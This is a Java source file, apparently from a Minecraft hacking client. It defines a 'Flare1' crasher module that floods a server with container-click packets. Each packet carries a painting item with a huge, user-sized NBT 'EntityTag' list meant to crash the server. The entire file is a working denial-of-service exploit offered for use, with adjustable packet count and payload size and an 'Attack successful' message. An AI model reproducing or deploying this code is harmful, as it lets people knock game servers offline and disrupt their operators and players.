package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.List;
import java.util.Optional;

public class Flare1 implements Crasher {
    private static final String METHOD_NAME = "Flare1";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);

        Int2ObjectMap<ItemStack> itemMap = new Int2ObjectOpenHashMap<>();
        ItemStack itemStack = new ItemStack(Items.PAINTING, 1, Optional.of(getNBTComponents(size)));

        for (int i = 0; i < packets; i++)PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 1, 1, ClickType.PICKUP, itemStack, itemMap));

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private CompoundTag getNBTComponents(int size) {
        ListTag entityTag = new ListTag();
        CompoundTag guwno = new CompoundTag();
        for (int i = 0; i < size; i++) entityTag.add(guwno);

        CompoundTag tag = new CompoundTag();
        tag.put("EntityTag", entityTag);

        return tag;
    }


    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER)
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[100], power[10], type[default]";
    }

    @Override
    public String getDescription() {
        return "Basic NBT Crasher";
    }
}
